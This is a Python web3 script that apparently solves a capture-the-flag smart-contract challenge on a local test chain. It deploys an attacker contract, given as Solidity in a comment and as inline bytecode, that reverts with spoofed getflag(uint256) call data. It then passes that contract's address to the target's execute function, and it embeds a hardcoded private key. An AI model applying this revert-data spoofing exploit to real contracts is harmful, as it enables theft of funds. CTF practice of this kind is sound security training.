from web3 import Web3, HTTPProvider
import time

w3 = Web3(Web3.HTTPProvider("http://127.0.0.1:8545"))

contract_address = "0x16a73a352f807764db6a5e040b642f2963A19170"
private0 = "afb7037dd17037f9a1426cd04d21a1cec5ef43f8723642abd629981472ae6c85"
public0 = "0xab813636aC44021d5653aC3A5F6367bA51992D6c"

def do_callme(public, private, _to, _data, _value):
    txn = {
        'chainId': 8888,
        'from': Web3.toChecksumAddress(public),
        'to': _to,
        'gasPrice': w3.eth.gasPrice,
        'gas': 3000000,
        'nonce': w3.eth.getTransactionCount(Web3.toChecksumAddress(public)),
        'value': Web3.toWei(_value, 'ether'),
        'data': _data,
    }
    signed_txn = w3.eth.account.signTransaction(txn, private)
    txn_hash = w3.eth.sendRawTransaction(signed_txn.rawTransaction).hex()
    txn_receipt = w3.eth.waitForTransactionReceipt(txn_hash)
    print("txn_hash=", txn_hash)
    return txn_receipt

"""
contract hack {
    bytes4 internal constant SEL = bytes4(keccak256('getflag(uint256)'));

    function execute(address) public pure {
        bytes4 sel = SEL;
        assembly {
            mstore(0,sel)
            mstore(0x4,0x6cc)
            revert(0,0x24)
        }
    }
}
"""

data0 = '608060405234801561001057600080fd5b5060fa8061001f6000396000f300608060405260043610603f576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680634b64e492146044575b600080fd5b348015604f57600080fd5b506082600480360381019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506084565b005b600060405180807f676574666c61672875696e743235362900000000000000000000000000000000815250601001905060405180910390209050806000526106cc60045260246000fd00a165627a7a72305820a45eb958070353941dcb0c95d75404136be68e1d2b8e162ab8faa2410ec9a9c50029'

x = do_callme(public0, private0, '', data0, 0)
print(x)

time.sleep(1)

data1 = '0x4b64e492'+x['contractAddress'][2:].rjust(64,'0')
print(data1)

print(do_callme(public0, private0, contract_address, data1, 0))